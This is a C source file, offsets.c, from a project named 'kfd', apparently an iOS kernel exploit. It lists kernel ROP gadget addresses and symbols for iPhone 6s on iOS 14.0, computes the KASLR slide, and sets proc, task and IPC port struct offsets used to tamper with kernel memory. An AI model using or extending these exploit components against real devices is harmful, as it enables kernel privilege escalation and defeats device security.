//
//  offsets.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/29.
//

#include "offsets.h"
#include <stdint.h>
#include <UIKit/UIKit.h>
#include <Foundation/Foundation.h>

extern uint64_t kbase;

#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_GREATER_THAN(v)              ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN(v)                 ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)     ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)

uint64_t *gadgets = NULL;
uint64_t *symbols = NULL;
uint64_t kaslr_slide = 0;

/* iOS 14.0 / iPhone 6s */
uint64_t kgadgets_iphone_6s_18a373[] = {
    0xFFFFFFF006805B44, // KGADGET_POPULATE
    0xFFFFFFF0066DCA84, // KGADGET_PROLOGUE
    0xFFFFFFF0064D26F8, // KGADGET_MOV_X12_X0__BR_X2
    0xFFFFFFF0074DF178, // KGADGET_MOV_X0_X3__BR_X4
    0xFFFFFFF007235050, // KGADGET_MOV_X0_X1__BR_X2
    0xFFFFFFF006544BA4, // KGADGET_MOV_X15_X2__BR_X3
    0xFFFFFFF006561048, // KGADGET_MOV_X20_X15__BR_X12
    0xFFFFFFF00665B4EC, // KGADGET_MOV_X11_X1__BR_X12
    0xFFFFFFF006599430, // KGADGET_MOV_X16_X1__BR_X2
    0xFFFFFFF006562880, // KGADGET_MOV_X10_X12__BR_X8
    0xFFFFFFF006589788, // KGADGET_MOV_X7_X16__BR_X10
    0xFFFFFFF0065A0BB8, // KGADGET_MOV_X10_X0__BR_X2
    0xFFFFFFF006AD1608, // KGADGET_MOV_X5_X8__BR_X10
    0xFFFFFFF0072FF92C, // KGADGET_MOV_X0_X20__BR_X11
    0xFFFFFFF0060412B8, // KGADGET_ADD_X0_X0_0X40__RET
};

uint64_t kgad(enum kgadget gad)
{
    kaslr_slide = kbase - 0xFFFFFFF007004000;

    return gadgets[gad] + kaslr_slide;
}

uint64_t ksymbols_iphone_6s_18a373[] = {
    0xFFFFFFF0070D01B8, // KSYMBOL_KERNPROC
    0xFFFFFFF005FDB230, // KSYMBOL_RET_300
};

uint64_t ksym(enum ksymbol sym)
{
    kaslr_slide = kbase - 0xFFFFFFF007004000;

    return symbols[sym] + kaslr_slide;
}

uint32_t off_p_pid = 0;
uint32_t off_p_list_le_prev = 0;
uint32_t off_p_task = 0;
uint32_t off_task_itk_space = 0;
uint32_t off_ipc_space_is_table = 0;
uint32_t off_ipc_space_is_task = 0;
uint32_t off_ipc_port_ip_receiver = 0;
uint32_t off_ipc_port_ip_kobject = 0;
uint32_t off_ipc_port_ikmq_base = 0;
uint32_t off_ipc_kmsg_ikm_header = 0;
uint32_t off_ipc_kmsg_ikm_data = 0;
uint32_t off_mach_msg_header_t_msgh_remote_port = 0;


void offsets_init(void) {
    if (!(SYSTEM_VERSION_EQUAL_TO(@"14.0"))) {
        printf("[-] Only supported offset for iOS 14.0\n");
        exit(EXIT_FAILURE);
    }
    
    if (SYSTEM_VERSION_EQUAL_TO(@"14.0")) {
        printf("[i] offsets selected for iOS 14.0\n");

        off_p_pid = 0x68; //v
        off_p_list_le_prev = 0x8;
        
        off_p_task = 0x10; //v
        
        off_task_itk_space = 0x330; //v
        off_ipc_space_is_table = 0x20;  //v
        off_ipc_space_is_task = 0x28; //v

        off_ipc_port_ip_kobject = 0x68; //v
        
        gadgets = kgadgets_iphone_6s_18a373;
        symbols = ksymbols_iphone_6s_18a373;
    }
}
